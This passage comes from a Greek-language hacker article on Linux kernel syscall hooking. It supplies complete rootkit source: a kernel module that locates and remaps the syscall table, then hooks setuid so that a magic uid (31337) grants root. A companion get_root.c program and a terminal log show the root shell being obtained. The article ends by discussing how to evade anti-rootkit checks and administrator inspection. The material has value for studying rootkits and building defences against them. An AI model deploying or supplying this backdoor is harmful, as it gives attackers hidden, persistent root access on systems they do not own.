+    Για το vmap θα χρειαστούμε να κάνουμε include το linux/vmalloc.h και το
+    linux/mm.h. Στο 1ο  argument θα περνάμε 2 page address επειδή μπορεί το
+    sys_call_table να είναι μοιρασμένο σε 2 κομμάτια αν ένα μέρος του
+    ανήκει στο επιμένω page. Στο 3ο argument θα περνάμε το flag VM_MAP, που
+    με αυτό λέμε στο vmap ότι του δώσαμε ένα array από pages για να τις
+    κάνει map. Στο 4ο  argument θα περνάμε το PAGE_KERNEL το οποιο θα μας
+    δώσει write access στο memory.
+
+    Το vmap θα μας επιστρέψει ένα address που είναι η αρχή του προτού page
+    που ζητήσαμε, έτσι για να πάμε στο sys_call_table θα πρέπει να
+    προσθέσουμε το offset του στο page, το offset αυτό μπορούμε να το
+    πάρουμε με το macro offset_in_page(). Στο cleanup function πρέπει να
+    καλέσουμε το vunmap() για να το κάνουμε unmap τα pages.
+
+
+    --function: get_writable_sct()--
+    void *get_writable_sct(void *sct_addr) {
+        struct page *p[2];
+        void *sct;
+        unsigned long addr = (unsigned long)sct_addr & PAGE_MASK;
+
+        if (sct_addr == NULL)
+            return NULL;
+
+    #if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,22) && defined(__x86_64__)
+        p[0] = pfn_to_page(__pa_symbol(addr) >> PAGE_SHIFT);
+        p[1] = pfn_to_page(__pa_symbol(addr + PAGE_SIZE) >> PAGE_SHIFT);
+    #else
+        p[0] = virt_to_page(addr);
+        p[1] = virt_to_page(addr + PAGE_SIZE);
+    #endif
+        sct = vmap(p, 2, VM_MAP, PAGE_KERNEL);
+        if (sct == NULL)
+            return NULL;
+        return sct + offset_in_page(sct_addr);
+    }
+    -- END OF FUNCTION --
+    
+    -- EXAMPLE --
+    void **sys_call_table = get_writable_sct(get_sys_call_table());
+    // hook some system calls
+    vunmap((void*)((unsigned long)sys_call_table & PAGE_MASK));
+    -- END OF EXAMPLE --
+
+
+--[ 0x0A Hook a system call
+
+    Για να κάνουμε hook ένα system call πρέπει πρώτα να φυλάξουμε το
+    αληθινό address του system call και μετά να το κάνουμε replace με το
+    address κάποιου δικού μας functon. Στο "include/linux/syscalls.h" από
+    το [5] μπορούμε να δούμε πως είναι δηλωμένα τα functions τον system
+    calls στον kernel. Για παράδειγμα του setuid είναι έτσι:
+
+    asmlinkage long sys_setuid(uid_t uid);
+
+    Το asmlinkage είναι ένα macro το οποίο λέει στον gcc ότι τα arguments
+    θα περάσουν μέσο του stack, έτσι δεν θα τα περνάει μέσο τον registers
+    σε περίπτωσις που θέλει να κάνει optimization. Εμείς στο module μας θα
+    δηλώσουμε αυτό:
+
+    asmlinkage long (*real_setuid)(uid_t uid);
+
+    Το real_setuid εδώ είναι ένα pointer σε function. Μετά θα φτιάξουμε το
+    δικό μας function το οποιο θα κάνει return real_setuid().
+
+    asmlinkage long hooked_setuid(uid_t uid) {
+        return real_setuid(uid);
+    }
+
+    Αν κάνουμε include το asm/unistd_32.h τότε θα έχουμε τους αριθμούς τον
+    system calls για το x86-32 και με το asm/unistd_64.h τους αριθμούς του
+    x86-64. Στα πιο παλιά versions του glibc αυτά ήταν asm-i386/unistd.h
+    και asm-x86_64/unistd.h. Αν κάνουμε include το asm/unistd.h τότε με
+    preprocessor θα αποφασίσει πιο από τα 2 θα χρησιμοποιήσει. Σε αυτά τα
+    files υπάρχουν defined τα system calls με prefix το __NR_. Δηλαδή με το
+    __NR_setuid θα πάρουμε τον αριθμό του setuid. Για να κάνουμε hook το
+    setuid κάνουμε το εξής:
+
+
+    real_setuid = sys_call_table[__NR_setuid];
+    sys_call_table[__NR_setuid] = hooked_setuid;
+
+
+    και στο cleanup για unhook θα κάνουμε:
+
+
+    sys_call_table[__NR_setuid] = real_setuid;
+
+
+    Όταν θέλουμε να κάνουμε το module να δουλεύει και στα 2 architecture
+    τότε πρέπει με χρησιμοποιήσουμε preprocessors. Αν είναι defined το
+    CONFIG_IA32_EMULATION τότε σημαίνει ότι στο x86-64 δουλεύουν και τα
+    x86-32 system calls. Το sys_call_table και το ia32_sys_call_table
+    περιέχουν τα ίδια address αλλα σε διαφορετικές θέσεις. Εδώ έχουμε ένα
+    μικρό πρόβλημα, δεν μπορούμε να κάνουμε include το asm/unistd_32.h και
+    το asm/unistd_64.h μαζί επειδή τα values έχουν τα ίδια ονόματα. Μια
+    απλή λύση είναι να φτιάξουμε ένα script που αν βρισκόμαστε σε x86-64 8a
+    κάνει copy το asm/unistd_32.h (αν δεν υπάρχει θα κάνουμε το
+    asm-i386/unistd.h) στο folder του source code μας και κάνει replace το
+    prefix __NR_ με __NR32_.
+
+
+--file: configure.sh--
+#!/bin/sh
+
+if [ `uname -m` = x86_64 ]; then
+    if [ -e /usr/include/asm/unistd_32.h ]; then
+        sed -e 's/__NR_/__NR32_/g' /usr/include/asm/unistd_32.h > unistd_32.h
+    else
+        if [ -e /usr/include/asm-i386/unistd.h ]; then
+            sed -e 's/__NR_/__NR32_/g' /usr/include/asm-i386/unistd.h > unistd_32.h
+        else
+            echo "asm/unistd_32.h and asm-386/unistd.h does not exist."
+        fi
+    fi
+fi
+--EOF--
+
+
+    Εδώ θα πρέπει να κάνουμε το include με αυτό:
+
+
+    #ifdef CONFIG_IA32_EMULATION
+    #include "unistd_32.h"
+    #endif
+
+
+    με αυτό θα κάνουμε hook:
+
+
+    #ifdef CONFIG_IA32_EMULATION
+        ia32_sys_call_table[__NR32_setuid] = hooked_setuid;
+    #endif
+
+
+    και με αυτό unhook:
+
+  
+    #ifdef CONFIG_IA32_EMULATION
+        ia32_sys_call_table[__NR32_setuid] = real_setuid;
+    #endif
+  
+
+    Να σημειώσω ότι κάποιες φορες όταν αλλάζουν τελείως το implementation
+    σε ένα system call επειδή το προηγούμενο έγινε deprecated τότε δεν
+    αλλάζουν τα values αλλα προσθέτουν νέα. Συγκεκριμένα μετά από κάποιο
+    version του x86-32 το setuid υπάρχει 2 φορες, sys_setuid16 και
+    sys_setuid. Το sys_setuid16 έχει τον αριθμό του __NR_setuid και το
+    sys_setuid τον αριθμό του __NR_setuid32. Σε αυτή την περίπτωση αν
+    θέλουμε μπορούμε να κάνουμε hook και τα 2 και με preprocessor να
+    προσθέσουμε κάποιο κώδικα. Αυτό δεν θα το υλοποιήσω, όμως θα δείξω την
+    περίπτωση που θέλουμε να κάνουμε hook μονο το sys_setuid.
+
+
+    hook:
+
+    #ifdef __NR_setuid32
+        real_setuid = sys_call_table[__NR_setuid32];
+        sys_call_table[__NR_setuid32] = hooked_setuid;
+    #else
+        real_setuid = sys_call_table[__NR_setuid];
+        sys_call_table[__NR_setuid] = hooked_setuid;
+    #endif
+    #ifdef CONFIG_IA32_EMULATION
+    #ifdef __NR32_setuid32
+        ia32_sys_call_table[__NR32_setuid32] = hooked_setuid;
+    #else
+        ia32_sys_call_table[__NR32_setuid] = hooked_setuid;
+    #endif
+    #endif
+
+
+    unhook:
+
+    #ifdef __NR_setuid32
+        sys_call_table[__NR_setuid32] = real_setuid;
+    #else
+        sys_call_table[__NR_setuid] = real_setuid;
+    #endif
+    #ifdef CONFIG_IA32_EMULATION
+    #ifdef __NR32_setuid32
+        ia32_sys_call_table[__NR32_setuid32] = real_setuid;
+    #else
+        ia32_sys_call_table[__NR32_setuid] = real_setuid;
+    #endif
+    #endif
+
+
+    Πριν σας δώσω ολόκληρο τον κώδικα του module ας φτιάξουμε κάτι
+    ενδιαφέρον στο hooked_setuid. Μια ωραία ιδέα είναι όταν καλέσουμε το
+    setuid και σαν uid του δώσουμε ένα "μαγικό" αριθμό να αλλάζει το uid
+    και gid του process σε 0. Με αλλα λόγια θα του δώσει δικαιώματα root
+    στο process.
+
+    Στον kernel υπάρχουνε πολλά data structures που μπορεί σε κάποια
+    versions να αλλάξουν αν βρεθούν vulnerabilities ή αν κατασκευάσουν
+    καλύτερο τρόπο υλοποίησης. Ένα από αυτά είναι το 'struct task_struct'
+    στο οποίο υπάρχουν διαφορες πληροφορίες για τα processes. Στο struct
+    αυτό υπάρχουν 8 variables που μας ενδιαφέρουν:
+
+    uid_t uid, euid, suid, fsuid;
+    gid_t gid, egid, sgid, fsgid;
+
+    Όταν αναφερόμαστε στο running process χρησιμοποιούμε το macro current.
+    Για αυτά τα 2 χρειαζόμαστε να κάνουμε include το linux/sched.h. Για να
+    δώσουμε root σε ένα process θα πρέπει να κάνουμε αυτά:
+
+    current->uid = current->euid = current->suid = current->fsuid = 0;
+    current->gid = current->egid = current->sgid = current->fsgid = 0;
+    return 0;
+
+    Όμως αυτό δεν θα δουλεύει από τον kernel 2.6.29 και μετά επειδή άλλαξε το
+    data structure και γενικά η διαδικασία που βάζει νέο uid και gid
+    στο process. Στην νέα μέθοδο υπάρχει ένα νέο struct, το 'struct cred'.
+    Για να αλλάξουμε uid και gid με τι νέα μέθοδο πρέπει πρώτα να καλέσουμε
+    το prepare_creds() το οποιο επιστρέφει pointer σε ένα νέο 'struct cred',
+    μετά θα αλλάξουμε τα variables, μετά θα τρέξουμε commit_creds() και το
+    αποτέλεσμα του θα το κάνουμε return.
+
+    struct cred *cred = prepare_creds();
+    cred->uid = cred->suid = cred->euid = cred->fsuid = 0;
+    cred->gid = cred->sgid = cred->egid = cred->fsgid = 0;
+    return commit_creds(cred);
+
+
+    Συμβουλή μου είναι να βλέπετε από το git τις διαφορες τον kernels.
+    ( http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=tags )
+
+
+--file: hook_setuid.c--
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/vmalloc.h>
+#include <linux/mm.h>
+#include <linux/sched.h>
+#include <asm/unistd.h>
+
+#ifdef CONFIG_IA32_EMULATION
+#include "unistd_32.h"
+#endif
+
+
+#ifdef __i386__
+struct idt_descriptor {
+    unsigned short offset_low;
+    unsigned short selector;
+    unsigned char zero;
+    unsigned char type_flags;
+    unsigned short offset_high;
+} __attribute__ ((packed));
+#elif defined(CONFIG_IA32_EMULATION)
+struct idt_descriptor {
+    unsigned short offset_low;
+    unsigned short selector;
+    unsigned char zero1;
+    unsigned char type_flags;
+    unsigned short offset_middle;
+    unsigned int offset_high;
+    unsigned int zero2;
+} __attribute__ ((packed));
+#endif
+
+struct idtr {
+    unsigned short limit;
+    void *base;
+} __attribute__ ((packed));
+
+
+void **sys_call_table;
+#ifdef CONFIG_IA32_EMULATION
+void **ia32_sys_call_table;
+#endif
+
+
+asmlinkage long (*real_setuid)(uid_t uid);
+
+asmlinkage long hooked_setuid(uid_t uid) {
+    if (uid == 31337) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,29)
+        struct cred *cred = prepare_creds();
+        cred->uid = cred->suid = cred->euid = cred->fsuid = 0;
+        cred->gid = cred->sgid = cred->egid = cred->fsgid = 0;
+        return commit_creds(cred);
+#else
+        current->uid = current->euid = current->suid = current->fsuid = 0;
+        current->gid = current->egid = current->sgid = current->fsgid = 0;
+        return 0;
+#endif
+    }
+    return real_setuid(uid);
+}
+
+
+#if defined(__i386__) || defined(CONFIG_IA32_EMULATION)
+#ifdef __i386__
+void *get_sys_call_table(void) {
+#elif defined(__x86_64__)
+void *get_ia32_sys_call_table(void) {
+#endif
+    struct idtr idtr;
+    struct idt_descriptor idtd;
+    void *system_call;
+    unsigned char *ptr;
+    int i;
+
+    asm volatile("sidt %0" : "=m"(idtr));
+
+    memcpy(&idtd, idtr.base + 0x80*sizeof(idtd), sizeof(idtd));
+
+#ifdef __i386__
+    system_call = (void*)((idtd.offset_high<<16) | idtd.offset_low);
+#elif defined(__x86_64__)
+    system_call = (void*)(((long)idtd.offset_high<<32) |
+                        (idtd.offset_middle<<16) | idtd.offset_low);
+#endif
+
+    for (ptr=system_call, i=0; i<500; i++) {
+#ifdef __i386__
+        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0x85)
+            return *((void**)(ptr+3));
+#elif defined(__x86_64__)
+        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5)
+            return (void*) (0xffffffff00000000 | *((unsigned int*)(ptr+3)));
+#endif
+        ptr++;
+    }
+
+    return NULL;
+}
+#endif
+
+
+#ifdef __x86_64__
+#define IA32_LSTAR  0xc0000082
+
+void *get_sys_call_table(void) {
+    void *system_call;
+    unsigned char *ptr;
+    int i, low, high;
+
+    asm volatile("rdmsr" : "=a" (low), "=d" (high) : "c" (IA32_LSTAR));
+
+    system_call = (void*)(((long)high<<32) | low);
+
+    for (ptr=system_call, i=0; i<500; i++) {
+        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5)
+            return (void*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
+        ptr++;
+    }   
+
+    return NULL;
+}
+#endif
+
+
+void *get_writable_sct(void *sct_addr) {
+    struct page *p[2];
+    void *sct;
+    unsigned long addr = (unsigned long)sct_addr & PAGE_MASK;
+
+    if (sct_addr == NULL)
+        return NULL;
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,22) && defined(__x86_64__)
+    p[0] = pfn_to_page(__pa_symbol(addr) >> PAGE_SHIFT);
+    p[1] = pfn_to_page(__pa_symbol(addr + PAGE_SIZE) >> PAGE_SHIFT);
+#else
+    p[0] = virt_to_page(addr);
+    p[1] = virt_to_page(addr + PAGE_SIZE);
+#endif
+    sct = vmap(p, 2, VM_MAP, PAGE_KERNEL);
+    if (sct == NULL)
+        return NULL;
+    return sct + offset_in_page(sct_addr);
+}
+
+static int __init hook_init(void) {
+    sys_call_table = get_writable_sct(get_sys_call_table());
+    if (sys_call_table == NULL)
+        return -1;
+
+#ifdef CONFIG_IA32_EMULATION
+    ia32_sys_call_table = get_writable_sct(get_ia32_sys_call_table());
+    if (ia32_sys_call_table == NULL) {
+        vunmap((void*)((unsigned long)sys_call_table & PAGE_MASK));
+        return -1;
+    }
+#endif
+
+    /* hook setuid */
+#ifdef __NR_setuid32
+    real_setuid = sys_call_table[__NR_setuid32];
+    sys_call_table[__NR_setuid32] = hooked_setuid;
+#else
+    real_setuid = sys_call_table[__NR_setuid];
+    sys_call_table[__NR_setuid] = hooked_setuid;
+#endif
+#ifdef CONFIG_IA32_EMULATION
+#ifdef __NR32_setuid32
+    ia32_sys_call_table[__NR32_setuid32] = hooked_setuid;
+#else
+    ia32_sys_call_table[__NR32_setuid] = hooked_setuid;
+#endif
+#endif
+    /***************/
+
+    return 0;
+}
+
+static void __exit hook_exit(void) {
+    /* unhook setuid */
+#ifdef __NR_setuid32
+    sys_call_table[__NR_setuid32] = real_setuid;
+#else
+    sys_call_table[__NR_setuid] = real_setuid;
+#endif
+#ifdef CONFIG_IA32_EMULATION
+#ifdef __NR32_setuid32
+    ia32_sys_call_table[__NR32_setuid32] = real_setuid;
+#else
+    ia32_sys_call_table[__NR32_setuid] = real_setuid;
+#endif
+#endif
+    /*****************/
+
+    // unmap memory
+    vunmap((void*)((unsigned long)sys_call_table & PAGE_MASK));
+#ifdef CONFIG_IA32_EMULATION
+    vunmap((void*)((unsigned long)ia32_sys_call_table & PAGE_MASK));
+#endif
+}
+
+module_init(hook_init);
+module_exit(hook_exit);
+MODULE_LICENSE("GPL");
+--EOF--
+
+--file: get_root.c--
+#include <unistd.h>
+
+int main() {
+    if (setuid(31337) == -1) {
+        perror("setuid");
+        return 1;
+    }
+    execlp("bash", "bash", NULL);
+}
+--EOF--
+
+
+    oblique@gentoo ~/hooking $ ./configure.sh 
+    oblique@gentoo ~/hooking $ make
+    make -C /lib/modules/2.6.34-zen1/build M=/home/oblique/hooking modules
+    make[1]: Entering directory `/usr/src/linux-2.6.34-zen1-r2'
+      CC [M]  /home/oblique/hooking/hook_setuid.o
+      Building modules, stage 2.
+      MODPOST 1 modules
+      CC      /home/oblique/hooking/hook_setuid.mod.o
+      LD [M]  /home/oblique/hooking/hook_setuid.ko
+    make[1]: Leaving directory `/usr/src/linux-2.6.34-zen1-r2'
+    oblique@gentoo ~/hooking $ sudo insmod hook_setuid.ko  
+    oblique@gentoo ~/hooking $ gcc get_root.c -o get_root
+    oblique@gentoo ~/hooking $ ./get_root 
+    gentoo hooking # id
+    uid=0(root) gid=0(root) groups=0(root)
+    gentoo hooking # rmmod hook_setuid
+    gentoo hooking # exit
+    exit
+    oblique@gentoo ~/hooking $ ./get_root 
+    setuid: Operation not permitted
+    oblique@gentoo ~/hooking $ 
+
+    
+--[ 0x0B Other ideas/methods
+    
+    Αυτό που είδαμε ήταν μια από τις πιο βασικές τεχνικές hooking. Υπάρχουν
+    και άλλες μέθοδοι με την ίδια όμως λογική. Για παράδειγμα αντί να
+    αλλάξουμε το sys_call_table μπορούσαμε να κάνουμε allocate ένα χορό
+    στην μνήμη του kernel και να αντιγράψουμε εκεί όλο το sys_call_table.
+    Μετά κάνουμε τις αλλαγές στα addresses του νέου array και τέλος
+    αλλάζουμε το address που θα γίνει call από το system_call. Αν θέλουμε
+    μπορούμε να αλλάξουμε την τιμή του intrerrupt 0x80 από IDT ή την τιμή
+    του IA32_LSTAR MSR και να πήγαινε σε μια δικια μας system_call. Ένα
+    άλλο ωραίο hooking που δεν έχει σχέση με system calls είναι να κάνουμε
+    hook το trap για τους debuggers, αυτό μπορεί να γίνει μέσω του
+    interrupt 3 από το IDT.
+
+    Αυτή η τεχνική έχει κάποιους περιορισμούς. Δεν μπορεί να εφαρμοστεί σε
+    συστήματα που έχουν απενεργοποιημένο το LKM support. Τα modules πρέπει
+    πάντα να γίνονται compile στον kernel που θα γίνουν load, δηλαδή με ένα
+    kernel update θέλει νέο compile. Η λύση σε αυτά είναι άλλες τεχνικές
+    που δουλεύουν από userland και αλλάζουν τον kernel μέσω του /dev/mem
+    και /dev/kmem, όμως εκεί πλέον υπάρχουν και τα ανάλογα protections.
+
+    Να σημειώσω ότι τα anti-rootkits συνήθως συγκρίνουν το sys_call_table
+    έτσι η μέθοδος που έδειξα καλύτερα να μην χρησιμοποιηθεί. Ίσως αν
+    αλλάξουμε την address του sys_call_table στο system_call ή αν φτιάξουμε
+    δικό μας system_call να είναι κάποιες λύσεις.  Επίσης με το lsmod ή
+    μέσω του /proc/kallsyms μπορεί ένας system admin να δει ότι συμβαίνει
+    κάτι ύποπτο.  Όμως με hooking μπορούν να λυθούν και αυτά.
+
+    Ελπίζω να βρήκατε ενδιαφέρον το άρθρο.
+    
+
+    Happy hacking,
+    oblique.
+
+
+--[ 0x0C Greets
+
+    Greets to grhack.net community, AthCon staff and p0wnbox.Team. Special
+    thanks to slasher, huku, sin, Hack_ThE_PaRaDiSe, krumel, smack for
+    their knowledge and their company. Thanks pytt, angel_scar and
+    killer_null for being good friends. Last but not least I want to give
+    kudos to my friends from the real world, psychedelic music and FF.C for
+    their songs and philosophy.
+
+
+--[ 0x0D References
+
+    [1] http://phrack.org/issues.html?issue=59&id=4#article
+    [2] http://phrack.org/issues.html?issue=58&id=7#article
+    [3] http://wiki.osdev.org/IDT#IDT_in_IA-32e_Mode_.2864-bit_IDT.29
+    [5] Linux Kernel source code ( http://kernel.org )
+    [6] KSplice source code ( http://www.ksplice.com/software )
+
+    Intel 64 and IA-32 Architectures Software Developer's Manual
+    ( http://www.intel.com/products/processor/manuals/ ):
+    [7] "Volume 3A: System Programming Guide", Sections: 5.8.7 - 5.9, 9.4
+    [8] "Volume 3B: System Programming Guide", Appendix B
+    [9] "Volume 2B: Instruction Set Reference, N-Z", Section: 4.2,
+        Instructions: RDMSR, WRMSR, SYSCALL
+
+# vim:tw=75:sts=4:sw=4:et
